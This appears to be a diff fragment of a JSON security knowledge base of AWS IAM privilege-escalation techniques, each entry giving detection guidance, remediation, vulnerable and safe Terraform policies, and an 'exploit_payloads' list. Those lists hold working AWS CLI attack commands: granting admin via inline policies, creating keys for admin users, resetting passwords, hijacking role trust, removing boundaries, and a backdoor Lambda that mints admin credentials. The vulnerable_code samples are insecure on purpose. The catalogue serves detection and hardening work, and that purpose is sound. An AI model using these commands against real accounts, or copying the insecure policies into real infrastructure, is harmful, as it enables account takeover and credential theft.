+        "https://docs.aws.amazon.com/IAM/latest/UserGuide/access_policies_boundaries.html"
+      ],
+      "tags": ["iam", "privilege-escalation", "policy-attachment", "rhino-method-9"]
+    },
+    {
+      "id": "AWS-IAM-PRIV-010",
+      "cwe": "CWE-269",
+      "name": "Privilege Escalation via iam:PutUserPolicy",
+      "severity": "CRITICAL",
+      "description": "An IAM principal with iam:PutUserPolicy can create or update an inline policy on any IAM user, granting arbitrary permissions including full admin access.",
+      "how_it_works": "Unlike managed policies which must be created separately, inline policies are embedded directly in a user. PutUserPolicy creates or overwrites an inline policy on the target user. An attacker puts an inline policy with Action:* Resource:* on their own user to gain admin access.",
+      "preconditions": [
+        "IAM principal has iam:PutUserPolicy permission",
+        "Permission is not restricted to specific user ARNs"
+      ],
+      "impact": [
+        "Immediate admin access by putting a permissive inline policy",
+        "Can grant permissions to any user in the account",
+        "Harder to audit than managed policy attachments (inline policies are per-user)"
+      ],
+      "affected_components": ["AWS IAM"],
+      "detection_guidance": "Scan for iam:PutUserPolicy in IAM policies. Monitor PutUserPolicy CloudTrail events. Alert when inline policies containing Action:* or Resource:* are created.",
+      "exploit_payloads": [
+        "aws iam put-user-policy --user-name attacker-user --policy-name admin-escalation --policy-document '{\"Version\":\"2012-10-17\",\"Statement\":[{\"Effect\":\"Allow\",\"Action\":\"*\",\"Resource\":\"*\"}]}'",
+        "aws iam list-user-policies --user-name attacker-user",
+        "aws iam get-user-policy --user-name attacker-user --policy-name admin-escalation"
+      ],
+      "vulnerable_code": "# Terraform - PutUserPolicy without restriction\nresource \"aws_iam_policy\" \"iam_manager\" {\n  name = \"iam-manager\"\n  policy = jsonencode({\n    Version = \"2012-10-17\"\n    Statement = [{\n      Effect   = \"Allow\"\n      Action   = \"iam:PutUserPolicy\"\n      Resource = \"*\"\n    }]\n  })\n}",
+      "safe_code": "# Terraform - deny inline policy creation entirely; use managed policies\nresource \"aws_iam_policy\" \"iam_manager\" {\n  name = \"iam-manager\"\n  policy = jsonencode({\n    Version = \"2012-10-17\"\n    Statement = [\n      {\n        Effect   = \"Deny\"\n        Action   = [\"iam:PutUserPolicy\", \"iam:PutRolePolicy\", \"iam:PutGroupPolicy\"]\n        Resource = \"*\"\n      }\n    ]\n  })\n}",
+      "remediation": [
+        "Deny iam:PutUserPolicy for all non-admin principals",
+        "Prefer managed policies over inline policies for easier auditing",
+        "Use SCPs to deny inline policy creation",
+        "Apply permissions boundaries to all users",
+        "Monitor PutUserPolicy events and alert on overly permissive inline policies"
+      ],
+      "references": [
+        "https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/",
+        "https://docs.aws.amazon.com/IAM/latest/UserGuide/access_policies_inline-using.html"
+      ],
+      "tags": ["iam", "privilege-escalation", "inline-policy", "rhino-method-10"]
+    },
+    {
+      "id": "AWS-IAM-PRIV-011",
+      "cwe": "CWE-269",
+      "name": "Privilege Escalation via iam:PutRolePolicy",
+      "severity": "CRITICAL",
+      "description": "An IAM principal with iam:PutRolePolicy can create or update an inline policy on any IAM role, granting that role arbitrary permissions.",
+      "how_it_works": "The attacker puts a permissive inline policy on a role they can assume. After the inline policy is created, the attacker assumes the role and gains the elevated permissions. This works on any role including cross-account roles, service roles, and the attacker's own role.",
+      "preconditions": [
+        "IAM principal has iam:PutRolePolicy permission",
+        "Attacker can assume at least one role in the account"
+      ],
+      "impact": [
+        "Escalate any assumable role to admin privileges",
+        "Backdoor service roles for persistent access",
+        "Modify CI/CD pipeline roles to inject into deployments"
+      ],
+      "affected_components": ["AWS IAM"],
+      "detection_guidance": "Scan for iam:PutRolePolicy with Resource:*. Monitor PutRolePolicy CloudTrail events. Detect inline policies added to roles outside of IaC deployment pipelines.",
+      "exploit_payloads": [
+        "aws iam put-role-policy --role-name my-role --policy-name escalation --policy-document '{\"Version\":\"2012-10-17\",\"Statement\":[{\"Effect\":\"Allow\",\"Action\":\"*\",\"Resource\":\"*\"}]}'",
+        "aws sts assume-role --role-arn arn:aws:iam::123456789012:role/my-role --role-session-name admin-session"
+      ],
+      "vulnerable_code": "resource \"aws_iam_policy\" \"devops\" {\n  name = \"devops-policy\"\n  policy = jsonencode({\n    Version = \"2012-10-17\"\n    Statement = [{\n      Effect   = \"Allow\"\n      Action   = \"iam:PutRolePolicy\"\n      Resource = \"*\"\n    }]\n  })\n}",
+      "safe_code": "resource \"aws_iam_policy\" \"devops\" {\n  name = \"devops-policy\"\n  policy = jsonencode({\n    Version = \"2012-10-17\"\n    Statement = [\n      {\n        Effect   = \"Deny\"\n        Action   = [\"iam:PutRolePolicy\", \"iam:PutUserPolicy\", \"iam:PutGroupPolicy\"]\n        Resource = \"*\"\n      }\n    ]\n  })\n}",
+      "remediation": [
+        "Deny iam:PutRolePolicy for non-admin principals",
+        "Use IaC pipelines as the only mechanism to modify role policies",
+        "Apply permissions boundaries to all roles",
+        "Monitor PutRolePolicy CloudTrail events",
+        "Use SCPs at the organization level to restrict inline policy creation"
+      ],
+      "references": [
+        "https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/"
+      ],
+      "tags": ["iam", "privilege-escalation", "inline-policy", "rhino-method-11"]
+    },
+    {
+      "id": "AWS-IAM-PRIV-012",
+      "cwe": "CWE-269",
+      "name": "Privilege Escalation via iam:CreateAccessKey",
+      "severity": "HIGH",
+      "description": "An IAM principal with iam:CreateAccessKey can create access keys for any IAM user, obtaining long-lived credentials to impersonate that user.",
+      "how_it_works": "The CreateAccessKey API generates a new access key pair (access key ID and secret key) for the specified user. If unrestricted, an attacker can create keys for an admin user, effectively impersonating them. Unlike temporary credentials, access keys do not expire by default.",
+      "preconditions": [
+        "IAM principal has iam:CreateAccessKey permission",
+        "Permission is not restricted to specific user ARNs",
+        "Target user exists and has fewer than 2 access keys (AWS limit)"
+      ],
+      "impact": [
+        "Long-lived credentials for any IAM user",
+        "Impersonation of admin users",
+        "Persistent access even if the attacker's own credentials are revoked",
+        "Credentials can be used from anywhere"
+      ],
+      "affected_components": ["AWS IAM"],
+      "detection_guidance": "Scan for iam:CreateAccessKey with Resource:*. Monitor CreateAccessKey CloudTrail events. Alert when keys are created for users outside of self-service key rotation. Track access key age and usage patterns.",
+      "exploit_payloads": [
+        "aws iam list-users",
+        "aws iam list-attached-user-policies --user-name admin-user",
+        "aws iam create-access-key --user-name admin-user",
+        "# Use the returned AccessKeyId and SecretAccessKey\nexport AWS_ACCESS_KEY_ID=AKIA...\nexport AWS_SECRET_ACCESS_KEY=...\naws sts get-caller-identity"
+      ],
+      "vulnerable_code": "# Terraform - CreateAccessKey for any user\nresource \"aws_iam_policy\" \"key_manager\" {\n  name = \"key-manager\"\n  policy = jsonencode({\n    Version = \"2012-10-17\"\n    Statement = [{\n      Effect   = \"Allow\"\n      Action   = \"iam:CreateAccessKey\"\n      Resource = \"*\"\n    }]\n  })\n}",
+      "safe_code": "# Terraform - restrict CreateAccessKey to self only\nresource \"aws_iam_policy\" \"self_service_keys\" {\n  name = \"self-service-keys\"\n  policy = jsonencode({\n    Version = \"2012-10-17\"\n    Statement = [{\n      Effect   = \"Allow\"\n      Action   = [\"iam:CreateAccessKey\", \"iam:DeleteAccessKey\", \"iam:ListAccessKeys\"]\n      Resource = \"arn:aws:iam::123456789012:user/$${aws:username}\"\n    }]\n  })\n}",
+      "remediation": [
+        "Restrict iam:CreateAccessKey to self (using ${aws:username} variable)",
+        "Require MFA for access key creation",
+        "Implement access key rotation policies",
+        "Monitor CreateAccessKey events for non-self-service usage",
+        "Consider eliminating long-lived access keys in favor of IAM Identity Center"
+      ],
+      "references": [
+        "https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/",
+        "https://docs.aws.amazon.com/IAM/latest/UserGuide/id_credentials_access-keys.html"
+      ],
+      "tags": ["iam", "privilege-escalation", "access-keys", "credential-theft", "rhino-method-12"]
+    },
+    {
+      "id": "AWS-IAM-PRIV-013",
+      "cwe": "CWE-269",
+      "name": "Privilege Escalation via iam:CreateLoginProfile",
+      "severity": "HIGH",
+      "description": "An IAM principal with iam:CreateLoginProfile can enable console access for any IAM user that does not yet have a password, allowing the attacker to log into the AWS Console as that user.",
+      "how_it_works": "The CreateLoginProfile API sets an initial password for an IAM user, enabling AWS Management Console access. If an admin user exists that only uses programmatic access (no console password), an attacker can create a login profile for that user, set a known password, and log into the console with the admin user's full permissions.",
+      "preconditions": [
+        "IAM principal has iam:CreateLoginProfile permission",
+        "Target user does not already have a console login profile",
+        "Permission is not restricted to specific user ARNs"
+      ],
+      "impact": [
+        "Console access as any IAM user without existing login profile",
+        "Full GUI access to all services the target user can access",
+        "Can enable MFA bypass if MFA conditions only apply to programmatic access"
+      ],
+      "affected_components": ["AWS IAM", "AWS Management Console"],
+      "detection_guidance": "Scan for iam:CreateLoginProfile with Resource:*. Monitor CreateLoginProfile CloudTrail events. Alert when login profiles are created for service accounts or admin users that should not have console access.",
+      "exploit_payloads": [
+        "aws iam list-users --query 'Users[?!PasswordLastUsed].UserName'",
+        "aws iam create-login-profile --user-name admin-service-account --password 'Att@cker-P@ss-2024!' --no-password-reset-required",
+        "# Log into AWS Console at https://123456789012.signin.aws.amazon.com/console\n# Username: admin-service-account\n# Password: Att@cker-P@ss-2024!"
+      ],
+      "vulnerable_code": "resource \"aws_iam_policy\" \"user_manager\" {\n  name = \"user-manager\"\n  policy = jsonencode({\n    Version = \"2012-10-17\"\n    Statement = [{\n      Effect   = \"Allow\"\n      Action   = \"iam:CreateLoginProfile\"\n      Resource = \"*\"\n    }]\n  })\n}",
+      "safe_code": "resource \"aws_iam_policy\" \"user_manager\" {\n  name = \"user-manager\"\n  policy = jsonencode({\n    Version = \"2012-10-17\"\n    Statement = [{\n      Effect   = \"Allow\"\n      Action   = \"iam:CreateLoginProfile\"\n      Resource = \"arn:aws:iam::123456789012:user/$${aws:username}\"\n    }]\n  })\n}",
+      "remediation": [
+        "Restrict iam:CreateLoginProfile to self only",
+        "Use IAM Identity Center (SSO) instead of IAM user passwords",
+        "Require MFA for all console logins",
+        "Monitor CreateLoginProfile CloudTrail events",
+        "Disable console access for service accounts via SCP"
+      ],
+      "references": [
+        "https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/",
+        "https://docs.aws.amazon.com/IAM/latest/UserGuide/id_credentials_passwords_admin-change-user.html"
+      ],
+      "tags": ["iam", "privilege-escalation", "console-access", "login-profile", "rhino-method-13"]
+    },
+    {
+      "id": "AWS-IAM-PRIV-014",
+      "cwe": "CWE-269",
+      "name": "Privilege Escalation via iam:UpdateLoginProfile",
+      "severity": "HIGH",
+      "description": "An IAM principal with iam:UpdateLoginProfile can reset the console password for any IAM user that already has a login profile, hijacking their console access.",
+      "how_it_works": "Unlike CreateLoginProfile which fails if a password already exists, UpdateLoginProfile changes the existing password. An attacker can reset any user's password to a known value, then log into the console as that user. This is particularly dangerous against admin users.",
+      "preconditions": [
+        "IAM principal has iam:UpdateLoginProfile permission",
+        "Target user already has a console login profile (password set)",
+        "Permission is not restricted to specific user ARNs"
+      ],
+      "impact": [
+        "Hijack console access for any IAM user with existing login",
+        "Lock out legitimate users by changing their passwords",
+        "Access all console-accessible resources of the target user"
+      ],
+      "affected_components": ["AWS IAM", "AWS Management Console"],
+      "detection_guidance": "Scan for iam:UpdateLoginProfile with Resource:*. Monitor UpdateLoginProfile CloudTrail events where the caller is not the target user. Alert on password changes performed by different users.",
+      "exploit_payloads": [
+        "aws iam list-users",
+        "aws iam update-login-profile --user-name admin-user --password 'N3w-Att@cker-P@ss!'",
+        "# Log into AWS Console with the reset password"
+      ],
+      "vulnerable_code": "resource \"aws_iam_policy\" \"hr_onboarding\" {\n  name = \"hr-onboarding\"\n  policy = jsonencode({\n    Version = \"2012-10-17\"\n    Statement = [{\n      Effect   = \"Allow\"\n      Action   = [\"iam:UpdateLoginProfile\", \"iam:CreateLoginProfile\"]\n      Resource = \"*\"\n    }]\n  })\n}",
+      "safe_code": "resource \"aws_iam_policy\" \"self_password\" {\n  name = \"self-password-management\"\n  policy = jsonencode({\n    Version = \"2012-10-17\"\n    Statement = [{\n      Effect   = \"Allow\"\n      Action   = \"iam:UpdateLoginProfile\"\n      Resource = \"arn:aws:iam::123456789012:user/$${aws:username}\"\n      Condition = {\n        Bool = {\n          \"aws:MultiFactorAuthPresent\" = \"true\"\n        }\n      }\n    }]\n  })\n}",
+      "remediation": [
+        "Restrict iam:UpdateLoginProfile to self-service only (${aws:username})",
+        "Require MFA for password changes",
+        "Use IAM Identity Center instead of IAM user passwords",
+        "Monitor UpdateLoginProfile events where caller differs from target",
+        "Implement break-glass procedures for admin password resets"
+      ],
+      "references": [
+        "https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/"
+      ],
+      "tags": ["iam", "privilege-escalation", "password-reset", "console-access", "rhino-method-14"]
+    },
+    {
+      "id": "AWS-IAM-PRIV-015",
+      "cwe": "CWE-269",
+      "name": "Privilege Escalation via iam:UpdateAssumeRolePolicy",
+      "severity": "CRITICAL",
+      "description": "An IAM principal with iam:UpdateAssumeRolePolicy can modify the trust policy of any role to allow themselves (or any principal) to assume it, effectively hijacking any role in the account.",
+      "how_it_works": "Every IAM role has a trust policy that defines who can assume it. UpdateAssumeRolePolicy replaces this trust policy entirely. An attacker modifies the trust policy of a high-privilege role to add their own principal as a trusted entity, then assumes the role to gain its permissions.",
+      "preconditions": [
+        "IAM principal has iam:UpdateAssumeRolePolicy permission",
+        "High-privilege roles exist in the account",
+        "Attacker knows the ARN of a target role"
+      ],
+      "impact": [
+        "Assume any role in the account regardless of current trust policy",
+        "Bypass cross-account trust restrictions",
+        "Hijack service roles (Lambda, ECS, EC2 instance profiles)",
+        "Full account compromise by assuming admin roles"
+      ],
+      "affected_components": ["AWS IAM", "AWS STS"],
+      "detection_guidance": "Scan for iam:UpdateAssumeRolePolicy in IAM policies. Monitor UpdateAssumeRolePolicy CloudTrail events. Alert when trust policies are modified to add unexpected principals. Track trust policy changes as configuration drift.",
+      "exploit_payloads": [
+        "aws iam update-assume-role-policy --role-name AdminRole --policy-document '{\"Version\":\"2012-10-17\",\"Statement\":[{\"Effect\":\"Allow\",\"Principal\":{\"AWS\":\"arn:aws:iam::123456789012:user/attacker\"},\"Action\":\"sts:AssumeRole\"}]}'",
+        "aws sts assume-role --role-arn arn:aws:iam::123456789012:role/AdminRole --role-session-name escalated",
+        "# Alternatively, trust an external account for cross-account access:\naws iam update-assume-role-policy --role-name AdminRole --policy-document '{\"Version\":\"2012-10-17\",\"Statement\":[{\"Effect\":\"Allow\",\"Principal\":{\"AWS\":\"arn:aws:iam::999999999999:root\"},\"Action\":\"sts:AssumeRole\"}]}'"
+      ],
+      "vulnerable_code": "# CDK - granting UpdateAssumeRolePolicy\nconst policy = new iam.PolicyStatement({\n  actions: ['iam:UpdateAssumeRolePolicy'],\n  resources: ['*'],\n});\ndevOpsRole.addToPolicy(policy);",
+      "safe_code": "# CDK - deny trust policy modification entirely\nconst denyTrustModification = new iam.PolicyStatement({\n  effect: iam.Effect.DENY,\n  actions: ['iam:UpdateAssumeRolePolicy'],\n  resources: ['*'],\n});\ndevOpsRole.addToPolicy(denyTrustModification);\n\n# Also implement SCP:\n# {\n#   \"Effect\": \"Deny\",\n#   \"Action\": \"iam:UpdateAssumeRolePolicy\",\n#   \"Resource\": \"*\",\n#   \"Condition\": {\n#     \"StringNotEquals\": {\n#       \"aws:PrincipalArn\": \"arn:aws:iam::*:role/AdminRole\"\n#     }\n#   }\n# }",
+      "remediation": [
+        "Deny iam:UpdateAssumeRolePolicy for all non-admin principals",
+        "Use SCPs to restrict trust policy modifications to specific admin roles",
+        "Monitor UpdateAssumeRolePolicy CloudTrail events closely",
+        "Implement AWS Config rules to detect trust policy drift",
+        "Use IAM Access Analyzer to identify roles with overly broad trust policies"
+      ],
+      "references": [
+        "https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/",
+        "https://docs.aws.amazon.com/IAM/latest/UserGuide/id_roles_manage_modify.html"
+      ],
+      "tags": ["iam", "privilege-escalation", "trust-policy", "assume-role", "rhino-method-15"]
+    },
+    {
+      "id": "AWS-IAM-PRIV-016",
+      "cwe": "CWE-269",
+      "name": "Privilege Escalation via iam:DeleteRolePermissionsBoundary",
+      "severity": "HIGH",
+      "description": "An IAM principal with iam:DeleteRolePermissionsBoundary can remove the permissions boundary from a role, expanding its effective permissions beyond what was intended.",
+      "how_it_works": "Permissions boundaries limit the maximum permissions an IAM entity can have, even if its policies grant broader access. A role may have policies granting Action:* but a permissions boundary restricting it to specific services. Removing the boundary causes the full policy permissions to take effect immediately.",
+      "preconditions": [
+        "IAM principal has iam:DeleteRolePermissionsBoundary permission",
+        "A role exists with a permissions boundary that restricts its effective permissions",
+        "The role's attached policies grant more permissions than the boundary allows"
+      ],
+      "impact": [
+        "Expand effective permissions of a role beyond intended limits",
+        "Bypass security controls implemented via permissions boundaries",
+        "Potentially escalate a limited role to full admin if underlying policies are broad"
+      ],
+      "affected_components": ["AWS IAM"],
+      "detection_guidance": "Scan for iam:DeleteRolePermissionsBoundary or iam:DeleteUserPermissionsBoundary in IAM policies. Monitor DeleteRolePermissionsBoundary CloudTrail events. Alert on any permissions boundary removal outside of approved change management.",
+      "exploit_payloads": [
+        "# Check current permissions boundary\naws iam get-role --role-name restricted-admin-role --query 'Role.PermissionsBoundary'",
+        "# Remove the boundary\naws iam delete-role-permissions-boundary --role-name restricted-admin-role",
+        "# Role now has full policy permissions without boundary restriction\naws sts assume-role --role-arn arn:aws:iam::123456789012:role/restricted-admin-role --role-session-name unbound"
+      ],
+      "vulnerable_code": "# Terraform - allowing boundary deletion\nresource \"aws_iam_policy\" \"boundary_manager\" {\n  name = \"boundary-manager\"\n  policy = jsonencode({\n    Version = \"2012-10-17\"\n    Statement = [{\n      Effect   = \"Allow\"\n      Action   = \"iam:DeleteRolePermissionsBoundary\"\n      Resource = \"*\"\n    }]\n  })\n}",
+      "safe_code": "# Terraform - SCP to deny permissions boundary deletion\nresource \"aws_organizations_policy\" \"protect_boundaries\" {\n  name = \"protect-permissions-boundaries\"\n  type = \"SERVICE_CONTROL_POLICY\"\n  content = jsonencode({\n    Version = \"2012-10-17\"\n    Statement = [{\n      Sid      = \"PreventBoundaryDeletion\"\n      Effect   = \"Deny\"\n      Action   = [\n        \"iam:DeleteRolePermissionsBoundary\",\n        \"iam:DeleteUserPermissionsBoundary\"\n      ]\n      Resource = \"*\"\n      Condition = {\n        StringNotLike = {\n          \"aws:PrincipalArn\" = \"arn:aws:iam::*:role/OrganizationAdmin\"\n        }\n      }\n    }]\n  })\n}",
+      "remediation": [
+        "Deny iam:DeleteRolePermissionsBoundary via SCP for all non-admin principals",
+        "Use SCPs as an additional layer of protection beyond IAM policies",
+        "Monitor DeleteRolePermissionsBoundary CloudTrail events",
+        "Implement AWS Config rules to detect missing permissions boundaries",
+        "Require permissions boundaries on all roles via SCP conditions"
+      ],
+      "references": [
+        "https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/",
+        "https://docs.aws.amazon.com/IAM/latest/UserGuide/access_policies_boundaries.html"
+      ],
+      "tags": ["iam", "privilege-escalation", "permissions-boundary", "rhino-method-16"]
+    },
+    {
+      "id": "AWS-IAM-PRIV-017",
+      "cwe": "CWE-269",
+      "name": "Privilege Escalation via iam:DeleteUserPermissionsBoundary",
+      "severity": "HIGH",
+      "description": "An IAM principal with iam:DeleteUserPermissionsBoundary can remove the permissions boundary from an IAM user, expanding the user's effective permissions.",
+      "how_it_works": "Identical to the role-based variant but targets IAM users. The attacker removes the permissions boundary from their own user (or another user), causing the user's attached policies to take full effect without the boundary's restrictions.",
+      "preconditions": [
+        "IAM principal has iam:DeleteUserPermissionsBoundary permission",
+        "A user exists with a permissions boundary that limits effective permissions",
+        "The user's policies grant more permissions than the boundary allows"
+      ],
+      "impact": [
+        "Expand user's effective permissions beyond intended limits",
+        "Bypass permissions boundary security controls",
+        "Self-escalation if attacker can remove their own boundary"
+      ],
+      "affected_components": ["AWS IAM"],
+      "detection_guidance": "Scan for iam:DeleteUserPermissionsBoundary in IAM policies. Monitor DeleteUserPermissionsBoundary CloudTrail events. Alert on any boundary removal.",
+      "exploit_payloads": [
+        "aws iam get-user --user-name my-user --query 'User.PermissionsBoundary'",
+        "aws iam delete-user-permissions-boundary --user-name my-user",
+        "# User now has full policy permissions\naws sts get-caller-identity"
+      ],
+      "vulnerable_code": "resource \"aws_iam_policy\" \"self_service\" {\n  name = \"self-service\"\n  policy = jsonencode({\n    Version = \"2012-10-17\"\n    Statement = [{\n      Effect   = \"Allow\"\n      Action   = \"iam:DeleteUserPermissionsBoundary\"\n      Resource = \"arn:aws:iam::123456789012:user/$${aws:username}\"\n    }]\n  })\n}",
+      "safe_code": "# Never allow users to delete their own permissions boundary\n# Use SCP to enforce:\nresource \"aws_organizations_policy\" \"protect_user_boundaries\" {\n  name = \"protect-user-boundaries\"\n  type = \"SERVICE_CONTROL_POLICY\"\n  content = jsonencode({\n    Version = \"2012-10-17\"\n    Statement = [{\n      Effect   = \"Deny\"\n      Action   = [\"iam:DeleteUserPermissionsBoundary\", \"iam:DeleteRolePermissionsBoundary\"]\n      Resource = \"*\"\n      Condition = {\n        StringNotLike = {\n          \"aws:PrincipalArn\" = \"arn:aws:iam::*:role/SecurityAdmin\"\n        }\n      }\n    }]\n  })\n}",
+      "remediation": [
+        "Deny iam:DeleteUserPermissionsBoundary for all non-security-admin principals",
+        "Enforce via SCP at the organization level",
+        "Monitor CloudTrail for boundary deletion events",
+        "Implement drift detection for permissions boundaries"
+      ],
+      "references": [
+        "https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/"
+      ],
+      "tags": ["iam", "privilege-escalation", "permissions-boundary", "rhino-method-17"]
+    },
+    {
+      "id": "AWS-IAM-PRIV-018",
+      "cwe": "CWE-269",
+      "name": "Privilege Escalation via lambda:UpdateFunctionCode + lambda:InvokeFunction",
+      "severity": "HIGH",
+      "description": "An attacker who can update a Lambda function's code and invoke it can replace the function with malicious code that executes with the function's existing IAM role, which may have higher privileges.",
+      "how_it_works": "Existing Lambda functions often have roles with broader permissions than the developer who deploys them. An attacker updates the function code to perform privileged actions (e.g., creating admin users, exfiltrating secrets) and then invokes the function. The malicious code runs with the Lambda execution role's permissions.",
+      "preconditions": [
+        "IAM principal has lambda:UpdateFunctionCode permission",
+        "IAM principal has lambda:InvokeFunction permission (or can trigger the function via events)",
+        "A Lambda function exists with a higher-privilege execution role"
+      ],
+      "impact": [
+        "Execute arbitrary code with the function's execution role privileges",
+        "Access secrets, databases, S3 data accessible to the function",
+        "Potential full account compromise if the function role is overly permissive"
+      ],
+      "affected_components": ["AWS Lambda", "AWS IAM"],
+      "detection_guidance": "Scan for lambda:UpdateFunctionCode in IAM policies. Monitor UpdateFunctionCode CloudTrail events. Implement code signing for Lambda functions to prevent unauthorized code changes. Compare deployed function code hashes against approved versions.",
+      "exploit_payloads": [
+        "# Create malicious function code\ncat > /tmp/lambda_function.py << 'EOF'\nimport boto3\nimport json\ndef handler(event, context):\n    iam = boto3.client('iam')\n    iam.create_user(UserName='backdoor')\n    iam.attach_user_policy(\n        UserName='backdoor',\n        PolicyArn='arn:aws:iam::aws:policy/AdministratorAccess'\n    )\n    keys = iam.create_access_key(UserName='backdoor')\n    return json.dumps(keys['AccessKey'], default=str)\nEOF",
+        "cd /tmp && zip function.zip lambda_function.py",
+        "aws lambda update-function-code --function-name existing-function --zip-file fileb:///tmp/function.zip",
+        "aws lambda invoke --function-name existing-function /tmp/output.json && cat /tmp/output.json"
+      ],
+      "vulnerable_code": "# Terraform - developer can update any Lambda function code\nresource \"aws_iam_policy\" \"lambda_developer\" {\n  name = \"lambda-developer\"\n  policy = jsonencode({\n    Version = \"2012-10-17\"\n    Statement = [{\n      Effect   = \"Allow\"\n      Action   = [\"lambda:UpdateFunctionCode\", \"lambda:InvokeFunction\"]\n      Resource = \"*\"\n    }]\n  })\n}",
+      "safe_code": "# Terraform - restrict to specific functions and require code signing\nresource \"aws_iam_policy\" \"lambda_developer\" {\n  name = \"lambda-developer\"\n  policy = jsonencode({\n    Version = \"2012-10-17\"\n    Statement = [{\n      Effect   = \"Allow\"\n      Action   = [\"lambda:UpdateFunctionCode\", \"lambda:InvokeFunction\"]\n      Resource = \"arn:aws:lambda:us-east-1:123456789012:function:myapp-*\"\n    }]\n  })\n}\n\n# Enable Lambda code signing\nresource \"aws_lambda_code_signing_config\" \"signing\" {\n  allowed_publishers {\n    signing_profile_version_arns = [aws_signer_signing_profile.example.version_arn]\n  }\n  policies {\n    untrusted_artifact_on_deployment = \"Enforce\"\n  }\n}",
+      "remediation": [
+        "Restrict lambda:UpdateFunctionCode to specific function ARNs",
+        "Implement Lambda code signing to prevent unauthorized code deployment",
+        "Apply least-privilege execution roles to Lambda functions",
+        "Deploy Lambda functions only through CI/CD pipelines",
+        "Monitor UpdateFunctionCode events and alert on manual updates"
+      ],
+      "references": [
+        "https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/",
+        "https://docs.aws.amazon.com/lambda/latest/dg/configuration-codesigning.html"
+      ],
+      "tags": ["iam", "lambda", "privilege-escalation", "code-injection", "rhino-method-18"]
+    },
+    {
+      "id": "AWS-IAM-PRIV-019",
+      "cwe": "CWE-863",
+      "name": "Cross-Account Role Assumption without ExternalId",
+      "severity": "HIGH",
+      "description": "An IAM role configured for cross-account access without requiring an ExternalId condition is vulnerable to the 'confused deputy' attack, allowing unauthorized third parties to assume the role.",
+      "how_it_works": "When Account A creates a role trusting Account B, any principal in Account B can assume the role. If a service in Account B is tricked by Account C into assuming the role on C's behalf (confused deputy), Account C gains access to Account A's resources. ExternalId is a shared secret that prevents this: only principals knowing the ExternalId can assume the role.",
+      "preconditions": [
+        "IAM role trusts an external AWS account",
+        "Trust policy does not require sts:ExternalId condition",
+        "The trusted account runs a multi-tenant service that assumes roles on behalf of customers"
+      ],
+      "impact": [
+        "Unauthorized cross-account access via confused deputy",
+        "Third-party accounts accessing resources in the trusting account",
+        "Data exfiltration or modification across account boundaries"
+      ],
+      "affected_components": ["AWS IAM", "AWS STS", "Cross-account role trust"],
+      "detection_guidance": "Scan all IAM role trust policies for cross-account principals without sts:ExternalId conditions. Use IAM Access Analyzer to identify roles accessible from external accounts. Audit trust policies in IaC templates.",
+      "exploit_payloads": [
+        "# From a principal in the trusted account (or any tenant of a multi-tenant service in that account)\naws sts assume-role --role-arn arn:aws:iam::111111111111:role/CrossAccountRole --role-session-name confused-deputy",
+        "# Verify access\naws s3 ls --profile cross-account",
+        "# If ExternalId were required, this would fail without providing it:\naws sts assume-role --role-arn arn:aws:iam::111111111111:role/CrossAccountRole --role-session-name test --external-id required-secret-id"
+      ],
+      "vulnerable_code": "# Terraform - cross-account trust without ExternalId\nresource \"aws_iam_role\" \"cross_account\" {\n  name = \"CrossAccountRole\"\n  assume_role_policy = jsonencode({\n    Version = \"2012-10-17\"\n    Statement = [{\n      Effect = \"Allow\"\n      Principal = {\n        AWS = \"arn:aws:iam::222222222222:root\"\n      }\n      Action = \"sts:AssumeRole\"\n    }]\n  })\n}",
+      "safe_code": "# Terraform - require ExternalId and restrict to specific role\nresource \"aws_iam_role\" \"cross_account\" {\n  name = \"CrossAccountRole\"\n  assume_role_policy = jsonencode({\n    Version = \"2012-10-17\"\n    Statement = [{\n      Effect = \"Allow\"\n      Principal = {\n        AWS = \"arn:aws:iam::222222222222:role/SpecificServiceRole\"\n      }\n      Action = \"sts:AssumeRole\"\n      Condition = {\n        StringEquals = {\n          \"sts:ExternalId\" = \"unique-external-id-per-customer\"\n        }\n      }\n    }]\n  })\n}",
+      "remediation": [
+        "Always require sts:ExternalId in cross-account trust policies",
+        "Use unique ExternalId values per customer/tenant",
+        "Restrict trust to specific role ARNs rather than account root",
+        "Use IAM Access Analyzer to find externally accessible roles",
+        "Regularly audit cross-account trust policies"
+      ],
+      "references": [
+        "https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/",
+        "https://docs.aws.amazon.com/IAM/latest/UserGuide/id_roles_create_for-user_externalid.html",
+        "https://docs.aws.amazon.com/IAM/latest/UserGuide/confused-deputy.html"
+      ],
+      "tags": ["iam", "sts", "cross-account", "confused-deputy", "external-id", "privilege-escalation", "rhino-method-19"]
+    },
+    {
+      "id": "AWS-IAM-PRIV-020",
+      "cwe": "CWE-269",
+      "name": "Privilege Escalation via codebuild:StartBuild with Privileged Service Role",
+      "severity": "HIGH",
+      "description": "An attacker with codebuild:StartBuild can trigger a CodeBuild project that runs with a privileged service role, and override build commands to execute arbitrary code with that role's permissions.",
+      "how_it_works": "CodeBuild projects have a service role that the build environment assumes. If an attacker can start a build and override the buildspec (build commands), they can execute arbitrary AWS CLI commands in the build container with the service role's credentials. Even without override permissions, the existing buildspec may expose credentials or allow exfiltration.",
+      "preconditions": [
+        "IAM principal has codebuild:StartBuild permission",
+        "A CodeBuild project exists with a high-privilege service role",
+        "Optionally: codebuild:UpdateProject to modify the buildspec, or the project allows buildspec override"
+      ],
+      "impact": [
+        "Execute arbitrary commands with the CodeBuild service role",
+        "Access secrets, S3, databases available to the service role",
+        "Inject malicious code into CI/CD pipelines",
+        "Exfiltrate credentials and data"
+      ],
+      "affected_components": ["AWS CodeBuild", "AWS IAM", "CI/CD pipelines"],
+      "detection_guidance": "Scan for codebuild:StartBuild in IAM policies. Check CodeBuild project service roles for overly broad permissions. Monitor StartBuild CloudTrail events with buildspecOverride. Alert on builds started outside of normal CI/CD triggers.",
+      "exploit_payloads": [
